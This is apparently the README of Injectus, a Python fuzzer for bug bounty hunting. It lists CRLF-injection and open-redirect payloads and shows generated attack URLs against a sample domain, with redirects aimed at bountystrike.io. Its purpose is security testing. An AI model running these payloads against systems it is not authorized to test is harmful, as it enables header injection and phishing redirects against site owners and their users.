# Injectus

Simple python tool that goes through a list of URLs trying CRLF and open redirect payloads.


```

    ▪   ▐ ▄  ▐▄▄▄▄▄▄ . ▄▄· ▄▄▄▄▄▄• ▄▌.▄▄ ·
    ██ •█▌▐█  ·██▀▄.▀·▐█ ▌▪•██  █▪██▌▐█ ▀.
    ▐█·▐█▐▐▌▪▄ ██▐▀▀▪▄██ ▄▄ ▐█.▪█▌▐█▌▄▀▀▀█▄
    ▐█▌██▐█▌▐▌▐█▌▐█▄▄▌▐███▌ ▐█▌·▐█▄█▌▐█▄▪▐█
    ▀▀▀▀▀ █▪ ▀▀▀• ▀▀▀ ·▀▀▀  ▀▀▀  ▀▀▀  ▀▀▀▀
               ~ BOUNTYSTRIKE ~

usage: Injectus [-h] [-f FILE] [-u URL] [-r] [-w WORKERS] [-t TIMEOUT]
                [-d DELAY] [-c] [-op]

CRLF and open redirect fuzzer. Crafted by @dubs3c.

optional arguments:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  File containing URLs
  -u URL, --url URL     Single URL to test
  -r, --no-request      Only build attack list, do not perform any requests
  -w WORKERS, --workers WORKERS
                        Amount of asyncio workers, default is 10
  -t TIMEOUT, --timeout TIMEOUT
                        HTTP request timeout, default is 6 seconds
  -d DELAY, --delay DELAY
                        The delay between requests, default is 1 second
  -c, --crlf            Only perform crlf attacks
  -op, --openredirect   Only perform open redirect attacks
```

## Motivation
Needed a simple CRLF/open redirect scanner that I could include into my bug bounty pipeline at [https://github.com/BountyStrike/Bountystrike-sh](https://github.com/BountyStrike/Bountystrike-sh). Didn't find any tools that satisfied my need, so I created Injectus. It's a little bit of an experiment, to see if it works better than other tools.

## Design

If we have the following URL:
```
https://dubell.io/?param1=value1&url=value2&param3=value3
```

**For CRLF attacks**, Injectus will inject every payload once into the value of one parameter, for every n parameters. For example, Injectus will create the following list with the URL above:
```
https://dubell.io/?param1=%%0a0abounty:strike&url=value2&param3=value3
https://dubell.io/?param1=%0abounty:strike&url=value2&param3=value3
https://dubell.io/?param1=%0d%0abounty:strike&url=value2&param3=value3
https://dubell.io/?param1=%0dbounty:strike&url=value2&param3=value3
https://dubell.io/?param1=%23%0dbounty:strike&url=value2&param3=value3
https://dubell.io/?param1=%25%30%61bounty:strike&url=value2&param3=value3
https://dubell.io/?param1=%25%30abounty:strike&url=value2&param3=value3
https://dubell.io/?param1=%250abounty:strike&url=value2&param3=value3
https://dubell.io/?param1=%25250abounty:strike&url=value2&param3=value3
https://dubell.io/?param1=%3f%0dbounty:strike&url=value2&param3=value3
https://dubell.io/?param1=%u000abounty:strike&url=value2&param3=value3

https://dubell.io/?param1=value1&url=%%0a0abounty:strike&param3=value3
https://dubell.io/?param1=value1&url=%0abounty:strike&param3=value3
https://dubell.io/?param1=value1&url=%0d%0abounty:strike&param3=value3
https://dubell.io/?param1=value1&url=%0dbounty:strike&param3=value3
https://dubell.io/?param1=value1&url=%23%0dbounty:strike&param3=value3
https://dubell.io/?param1=value1&url=%25%30%61bounty:strike&param3=value3
https://dubell.io/?param1=value1&url=%25%30abounty:strike&param3=value3
https://dubell.io/?param1=value1&url=%250abounty:strike&param3=value3
https://dubell.io/?param1=value1&url=%25250abounty:strike&param3=value3
https://dubell.io/?param1=value1&url=%3f%0dbounty:strike&param3=value3
https://dubell.io/?param1=value1&url=%u000abounty:strike&param3=value3

https://dubell.io/?param1=value1&url=value2&param3=%%0a0abounty:strike
https://dubell.io/?param1=value1&url=value2&param3=%0abounty:strike
https://dubell.io/?param1=value1&url=value2&param3=%0d%0abounty:strike
https://dubell.io/?param1=value1&url=value2&param3=%0dbounty:strike
https://dubell.io/?param1=value1&url=value2&param3=%23%0dbounty:strike
https://dubell.io/?param1=value1&url=value2&param3=%25%30%61bounty:strike
https://dubell.io/?param1=value1&url=value2&param3=%25%30abounty:strike
https://dubell.io/?param1=value1&url=value2&param3=%250abounty:strike
https://dubell.io/?param1=value1&url=value2&param3=%25250abounty:strike
https://dubell.io/?param1=value1&url=value2&param3=%3f%0dbounty:strike
https://dubell.io/?param1=value1&url=value2&param3=%u000abounty:strike
```

As you can see, every CRLF payload is injected in the first parameter's value. Once the loop is done, Injectus will inject every payload into the second parameter, and so on. Once all parameters have been injected, the list is complete.

If there are no query parameters, Injectus will simply append each payload to the URL, like so:
```
https://dubell.io/some/path/%%0a0abounty:strike
https://dubell.io/some/path/%0abounty:strike
https://dubell.io/some/path/%0d%0abounty:strike
https://dubell.io/some/path/%0dbounty:strike
https://dubell.io/some/path/%23%0dbounty:strike
https://dubell.io/some/path/%23%0dbounty:strike
https://dubell.io/some/path/%25%30%61bounty:strike
https://dubell.io/some/path/%25%30abounty:strike
https://dubell.io/some/path/%250abounty:strike
https://dubell.io/some/path/%25250abounty:strike
https://dubell.io/some/path/%3f%0dbounty:strike
https://dubell.io/some/path/%3f%0dbounty:strike
https://dubell.io/some/path/%u000abounty:strike
```

**When injecting open redirect payloads**, Injectus will only inject a payload if there exists a query/path parameter containing a typical redirect keyword, e.g. `url`. Injecting into the following URL `https://dubell.io/?param1=value1&url=dashboard&param3=value3`:
```
https://dubell.io/?param1=value1&url=$2f%2fbountystrike.io%2f%2fparam3=value3
https://dubell.io/?param1=value1&url=%2f$2fbountystrike.ioparam3=value3
https://dubell.io/?param1=value1&url=%2fbountystrike.io%2f%2fparam3=value3
https://dubell.io/?param1=value1&url=%2fbountystrike.io//param3=value3
https://dubell.io/?param1=value1&url=%2fbountystrike.ioparam3=value3
https://dubell.io/?param1=value1&url=////bountystrike.ioparam3=value3
https://dubell.io/?param1=value1&url=///bountystrike.ioparam3=value3
https://dubell.io/?param1=value1&url=//bountystrike.ioparam3=value3
https://dubell.io/?param1=value1&url=/\x08ountystrike.ioparam3=value3
https://dubell.io/?param1=value1&url=/bountystrike.ioparam3=value3
https://dubell.io/?param1=value1&url=/http://bountystrike.ioparam3=value3
https://dubell.io/?param1=value1&url=bountystrike.ioparam3=value3
```
The URL contains the query parameter `url`, so Injectus will inject the payloads into that parameter.

An example when using path parameters. Original URL is `https://dubell.io/some/path/that/redirect/dashboard`:
```
https://dubell.io/some/path/that/redirect/$2f%2fbountystrike.io%2f%2f
https://dubell.io/some/path/that/redirect/%2f$2fbountystrike.io
https://dubell.io/some/path/that/redirect/%2fbountystrike.io%2f%2f
https://dubell.io/some/path/that/redirect/%2fbountystrike.io
https://dubell.io/some/path/that/redirect/%2fbountystrike.io//
https://dubell.io/some/path/that/redirect/////bountystrike.io
https://dubell.io/some/path/that/redirect////bountystrike.io
https://dubell.io/some/path/that/redirect///bountystrike.io
https://dubell.io/some/path/that/redirect//\x08ountystrike.io
https://dubell.io/some/path/that/redirect//bountystrike.io
https://dubell.io/some/path/that/redirect//http://bountystrike.io
https://dubell.io/some/path/that/redirect/bountystrike.io
```

As before, if no query parameters or path parameters are found, Injectus will simply append each payload to the URL:
```
https://dubell.io/$2f%2fbountystrike.io%2f%2f
https://dubell.io/%2f$2fbountystrike.io
https://dubell.io/%2fbountystrike.io%2f%2f
https://dubell.io/%2fbountystrike.io
https://dubell.io/%2fbountystrike.io//
https://dubell.io/////bountystrike.io
https://dubell.io////bountystrike.io
https://dubell.io///bountystrike.io
https://dubell.io//\\bountystrike.io
https://dubell.io//bountystrike.io
https://dubell.io//http://bountystrike.io
https://dubell.io/bountystrike.io
```

## Installation
```
pip3.7 install -r requirements.txt --user
```

## Contributing
Any feedback or ideas are welcome! Want to improve something? Create a pull request!

1. Fork it!
2. Create your feature branch: `git checkout -b my-new-feature`
3. Configure pre commit checks: `pre-commit install`
4. Commit your changes: `git commit -am 'Add some feature'`
5. Push to the branch: `git push origin my-new-feature`
6. Submit a pull request :D
